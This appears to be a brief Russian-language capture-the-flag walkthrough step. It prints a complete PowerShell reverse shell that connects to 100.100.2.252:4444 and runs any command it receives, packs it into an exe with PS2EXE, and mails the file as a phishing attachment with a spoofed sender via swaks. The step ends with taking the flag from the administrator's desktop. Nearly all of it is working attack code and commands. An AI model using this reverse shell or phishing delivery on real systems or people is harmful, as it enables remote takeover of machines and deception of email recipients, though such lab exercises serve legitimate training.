берем созданную нагрузку в прошлом задаче и с помощи утилиты https://github.com/MScholtes/PS2EXE создаем exe файл
```
$client = New-Object System.Net.Sockets.TCPClient("100.100.2.252",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sb = (iex $data 2>&1 | Out-String );
    $stream.Write([text.encoding]::ASCII.GetBytes($sb),0,$sb.Length);
}
```
запускаем слушателя и отправляем созданный файл на почту  swaks --h-From: "Site" --from "kali@kali.com" --to james@knight.com -tlso --header "Subject: Онлайн портал  " --body "Здравствуйте" --attach @shelllnk.exe -s 10.10.0.28:587
забираем флаг с рабочего стола администратора